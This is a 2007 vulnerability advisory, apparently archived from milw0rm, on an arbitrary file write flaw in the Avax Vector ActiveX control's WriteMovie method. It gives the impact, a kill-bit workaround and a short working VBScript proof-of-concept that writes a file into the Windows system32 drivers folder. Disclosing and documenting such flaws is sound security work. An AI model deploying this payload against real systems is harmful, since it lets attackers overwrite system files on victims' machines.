@@ -1,0 +1,80 @@
+:. GOODFELLAS Security Research TEAM  .:
+:. http://goodfellas.shellcode.com.ar .:
+
+Avaxswf.dll v.1.0.0.1 from Avax Vector software ActiveX Arbitrary Data Write
+============================================================================
+
+Internal ID: VULWAR200706264.
+
+Introduction
+------------
+Avaxswf.dll is a library included in the Avax Vector ActiveX v.1.3 software
+package from the Company Civitech. 
+( http://business.hol.gr/gardos/index.htm )
+Such package include ActiveX control (OCX) that includes over 500 properties,
+methods, and events to provide full control over vector drawings.
+One of the Avaxswf.dll exported methods is vulnerable to Data write arbitrary 
+in a remote computer.
+
+
+Tested In
+---------
+- Windows XP SP2 english/french with IE 6.0 / 7.0.
+- windows vista Professional SP1 with IE 7.0.
+
+
+Summary
+-------
+The WriteMovie method doesn't check if it is being called from the application
+or from a malicious user.
+
+
+Impact
+------
+The vulnerability is due to an error in WriteMovie method that manipulate
+local files insecurely, which could allow malicious users to write arbitrary
+data to any file on a vulnerable system.
+
+
+Workaround
+----------
+- Activate the Kill bit zero in clsid:0DD77391-686B-11D4-B367-D4475FDFF33A.
+- Unregister Avaxswf.dll using regsvr32.
+
+
+Timeline
+--------
+June 26, 2007 -- Bug discovery.
+June 26, 2007 -- Bug published.
+
+
+Credits
+-------
+ * callAX <callax@shellcode.com.ar>
+ * GoodFellas Security Research Team <goodfellas.shellcode.com.ar>
+
+
+
+Technical Detail
+----------------
+WriteMovie method receives one argument filename in this format "c:\path\file".
+
+POC
+---
+
+<object classid='clsid:0DD77391-686B-11D4-B367-D4475FDFF33A' id='wRit3'></object>
+<input language=VBScript onclick=Boom() type=button value="Write">
+
+<script language = 'vbscript'>
+
+sub Boom() 
+
+   f1l3 = "C:\WINDOWS\system32\drivers\hackme.sys"
+
+   wRit3.WriteMovie f1l3
+
+ End Sub
+
+</script>
+
+# milw0rm.com [2007-06-26]
